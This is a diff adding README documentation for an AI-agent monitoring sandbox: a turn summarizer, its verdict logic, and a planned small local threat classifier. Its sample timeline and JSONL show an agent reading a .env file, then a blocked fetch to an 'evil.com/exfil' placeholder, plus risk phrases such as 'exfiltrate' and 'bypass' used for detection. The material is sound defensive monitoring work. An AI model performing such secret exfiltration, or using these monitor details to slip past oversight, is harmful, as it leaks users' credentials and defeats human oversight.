@@ -368,12 +368,159 @@ The most important test proves the full pipeline with real TLS:
 - **pytest** for tests
 - Optional: `certifi` for system CA bundle discovery
 
+## Auto-Summarizer: LLM Call Timeline
+
+The `CallSummarizer` produces a structured log of every LLM conversation turn,
+capturing the full intent→action→outcome→verdict chain without requiring any
+LLM inference. It uses lightweight regex-based intent extraction and tool call
+classification.
+
+### Data Flow
+
+```
+LLM Turn
+    │
+    ├── Reasoning text ──► extract_intent()
+    │                       ├── Match intent patterns ("I'll read...", "I'll send...")
+    │                       ├── Extract targets (file paths, hosts, URLs)
+    │                       └── Flag risk phrases ("exfiltrate", "bypass", "encode secret")
+    │
+    ├── Tool calls ──► classify_action()
+    │                   ├── Map tool_name → ActionCategory
+    │                   ├── Reclassify bash+curl → NETWORK_REQUEST
+    │                   └── Extract target (path, host, command)
+    │
+    ├── Sandbox decisions ──► (allowed, reason) per tool call
+    │
+    └── Alert count from TraceAnalyzer
+    │
+    ▼
+TurnSummary
+    ├── intent: IntentSignal (summary, targets, risk_phrases)
+    ├── actions: list[ActionRecord] (tool, category, target, allowed, reason)
+    ├── verdict: SAFE | SUSPICIOUS | BLOCKED | ERROR
+    ├── tainted_at_start: bool
+    └── duration_ms: float
+```
+
+### Verdict Logic
+
+```
+Any action blocked by sandbox?     → BLOCKED
+Risk phrases in reasoning?         → SUSPICIOUS
+Alerts from TraceAnalyzer?         → SUSPICIOUS
+Otherwise                          → SAFE
+```
+
+### Output Formats
+
+**Human-readable timeline:**
+```
+[ ] Turn 1            (0.1ms)
+    Intent: read files
+    [ALLOW] read_file → file_read  target=.env  (25B)
+
+[X] Turn 2 [TAINTED]  (0.1ms)
+    Intent: make network request
+    [BLOCK] fetch → network_request  target=https://evil.com/exfil  (0B)
+           Reason: BLOCKED: tainted process sending to non-allowlisted host
+
+[ ] Turn 3 [TAINTED]  (0.1ms)
+    Intent: edit code
+    Targets: app.py
+    [ALLOW] edit → code_edit  target=app.py  (2B)
+    [ALLOW] bash → shell_command  target=pytest tests/  (8B)
+```
+
+**JSONL (for downstream classifiers or log aggregation):**
+```json
+{"turn":1,"intent":"read files","targets":[],"risk_phrases":[],"actions":[{"tool":"read_file","category":"file_read","target":".env","bytes":25,"allowed":true}],"verdict":"safe","tainted":false}
+{"turn":2,"intent":"make network request","actions":[{"tool":"fetch","category":"network_request","target":"https://evil.com/exfil","bytes":0,"allowed":false,"reason":"BLOCKED: tainted + non-allowlisted"}],"verdict":"blocked","tainted":true}
+```
+
+### Session Summary
+
+Aggregates across all turns: total actions, files read/written, network requests,
+unique hosts, blocked count, suspicious turns, first taint/block turn numbers.
+
+## Future: Small Local Classifier Models
+
+The JSONL output from `CallSummarizer` is designed to be fed into a small
+classification model for real-time risk scoring. Candidate approaches:
+
+### Recommended Models (CPU-only, no GPU required)
+
+| Model | Size | Speed (CPU) | Use Case |
+|-------|------|-------------|----------|
+| **DeBERTa-v3-xsmall** | 22M params | ~5ms/inference | Binary classification (safe/threat) |
+| **MiniLM-L6-v2** | 22M params | ~5ms/inference | Sentence similarity for intent matching |
+| **TinyBERT** | 14.5M params | ~3ms/inference | Fastest option for binary classification |
+| **Phi-3-mini (3.8B, Q4)** | 2.2GB GGUF | ~200ms/token | Full reasoning about suspicious patterns |
+| **Qwen2.5-0.5B (Q4)** | 400MB GGUF | ~50ms/token | Lightweight reasoning |
+| **SmolLM-135M** | 135M params | ~10ms/token | Smallest generative model |
+
+### Architecture for Local Classifier
+
+```
+JSONL turn record
+    │
+    ▼
+Feature extraction (no model needed):
+    ├── intent_category: enum
+    ├── has_risk_phrases: bool
+    ├── num_actions: int
+    ├── action_categories: set
+    ├── tainted: bool
+    ├── bytes_out: int
+    ├── unique_hosts: int
+    └── blocked_ratio: float
+    │
+    ▼
+DeBERTa-v3-xsmall (22M, ONNX Runtime)
+    ├── Input: concatenated features as text
+    ├── Output: P(threat) ∈ [0, 1]
+    └── Threshold: 0.7 → flag for review
+    │
+    ▼
+Risk score per turn + session-level aggregate
+```
+
+### Training Data Strategy
+
+Fine-tune on synthetic data generated from the attack scenarios:
+1. Run all 19 attack scenarios (8 disruption + 11 disclosure) through the summarizer
+2. Label each turn: 0 = safe, 1 = threat
+3. Add normal coding session recordings as negative examples
+4. Fine-tune DeBERTa-v3-xsmall with HuggingFace Trainer (~5 minutes on CPU)
+5. Export to ONNX for fast inference
+
+### State of the Art: Threat Detection Techniques
+
+Modern endpoint detection (CrowdStrike, SentinelOne, Microsoft Defender) uses:
+
+- **Behavioral analysis over signatures**: classify process trees, not file hashes.
+  Our taint tracking + anomaly detection follows this pattern.
+- **eBPF-based runtime security** (Falco, Tetragon, Tracee): kernel-level syscall
+  monitoring without ptrace overhead. Our strace approach is similar but userspace.
+- **ML models for syscall sequences**: LSTM/Transformer on syscall traces to detect
+  anomalous patterns. Our shape detector is a lightweight version of this.
+- **Supply chain attack detection**: monitor for unexpected network connections from
+  build tools. Our MITM proxy catches this for agent tool calls.
+- **LLM-specific defenses**: prompt injection detection, tool call validation,
+  output filtering. Our trace analyzer covers the reasoning/intent side.
+
+The key insight from modern EDR: **behavior > signatures**. Our multi-layer
+approach (taint + LSH + anomaly + MITM + trace analysis + auto-summarizer)
+mirrors this by combining static signals (secret patterns) with behavioral
+signals (access patterns, network timing, request shapes).
+
 ## File Map
 
 ```
 sandbox/
 ├── sandbox.py              # Sandbox class: taint + LSH + anomaly + policy
 ├── env_scanner.py          # Project scanner: secrets, PII, infrastructure
+├── call_summarizer.py      # Auto-summarizer: LLM call timeline + JSONL export
 ├── proxy/
 │   ├── cert.py             # CA generation + per-host cert signing
 │   ├── mitm.py             # MITM proxy: CONNECT, TLS termination, inspection
@@ -382,7 +529,8 @@ sandbox/
 ├── doc_scanner.py          # Document classification (medical, financial, etc.)
 ├── trace_analyzer.py       # LLM trace behavioral analysis
 ├── test_e2e.py             # Strace + scanner + pipeline tests
-└── test_mitm_e2e.py        # MITM proxy E2E tests
+├── test_mitm_e2e.py        # MITM proxy E2E tests
+└── test_call_summarizer.py # Auto-summarizer tests (43 tests)
 
 agent-sandbox/
 ├── core/
